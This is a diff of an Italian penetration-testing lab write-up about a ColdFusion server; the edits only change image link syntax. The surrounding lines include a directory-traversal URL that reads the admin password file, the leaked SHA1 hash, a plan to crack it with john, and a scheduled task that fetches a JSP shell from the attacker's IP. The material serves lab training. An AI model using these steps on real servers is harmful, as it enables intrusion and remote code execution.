@@ -96,7 +96,7 @@ http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../.
 In realtà non dobbiamo eseguire il file exploit. 
 Invece, potremmo semplicemente navigare verso l'URL sopra per visualizzare il contenuto del file `password.properties`.
 
-![[1*1WRx1zCNkyVb_qfEHcQYiA.webp]]
+![imag2](../zzz_rev/attachments/1*1WRx1zCNkyVb_qfEHcQYiA.webp)
 password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
 
 l'hash sembra essere un SHA1 proviamo ad darlo in impasto a john per rompere l'hash
@@ -132,7 +132,7 @@ Prepariamo un payload come segue
 Ci spostiamo nella sezione "DEBUGGING & LOGGING > ADD/EDIT SCHEDULED TASK 
 e aggiungiamo un nuovo schedule
 
-![[1*HqvdBk09BVtq1448nzEWFA.webp]]
+![imag3](../zzz_rev/attachments/1*HqvdBk09BVtq1448nzEWFA.webp)
 
 alla voce Url mettiamo il nostro ip
 http://10.10.14.53:80/shell.jsp
